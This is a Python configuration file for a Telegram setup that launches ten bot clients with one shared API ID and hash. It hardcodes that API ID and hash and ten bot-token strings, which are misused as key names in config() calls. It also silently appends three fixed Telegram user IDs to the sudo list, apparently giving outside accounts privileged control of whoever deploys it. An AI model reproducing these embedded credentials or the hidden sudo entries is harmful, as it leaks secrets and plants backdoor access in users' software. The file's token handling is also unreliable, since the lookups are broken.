import os
from telethon import TelegramClient
from decouple import config
from os import getenv
import logging


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)


#values
API_ID = 20353207
API_HASH = "e5b2ac2f9c37bda345fa9fb5ade66961"
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("7549765620:AAEIoTo3gRIHXpGeqmBD0OGZ0Q2K4bgbA3k", default=None)
BOT_TOKEN2 = config("7788120736:AAGrVgy8eFc8Rl9qCTofg2EPAlhlKc94JiQ", default=None)
BOT_TOKEN3 = config("8017678725:AAG8iACQO-Z_LPECI2ayVSWWlphtRpasdD8", default=None)
BOT_TOKEN4 = config("7865510363:AAHhw7-QRN_gYQTouURuAVJts-qeGJoMU1M", default=None)
BOT_TOKEN5 = config("7624556287:AAFjOCUq37jqACq_4cstGTAQZKG5Q_7jd3o", default=None)
BOT_TOKEN6 = config("7705144126:AAGWGWMGEQ9q1-BhN4ZmJr8LJ8kSAVBqlvk", default=None)
BOT_TOKEN7 = config("7664438688:AAG6OUxQbReI2BoqSGd31oH7lpsWevLcrHs", default=None)
BOT_TOKEN8 = config("7715802027:AAGMVpsNm60A6ZF0IJTQIQ3MdUnTTNcvA3o", default=None)
BOT_TOKEN9 = config("7460750510:AAGhB6mKGIMhAZQszh3jUQqYUH_NpCmqlBw", default=None)
BOT_TOKEN10 = config("7603228174:AAHpLlQgFmRDdRD3tRl9IlwMWnCjsBfcIZE", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
SUDO_USERS.append(6713994904)
SUDO_USERS.append(6444118836)
SUDO_USERS.append(7361908601)

OWNER_ID = int(os.environ.get("OWNER_ID", None))


# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)

# Tokens
MK1 = TelegramClient('MK', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
MK2 = TelegramClient('MK2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
MK3 = TelegramClient('MK3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)
MK4 = TelegramClient('MK4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)
MK5 = TelegramClient('MK5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)
MK6 = TelegramClient('MK6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)
MK7 = TelegramClient('MK7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)
MK8 = TelegramClient('MK8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)
MK9 = TelegramClient('MK9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
MK10 = TelegramClient('MK10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
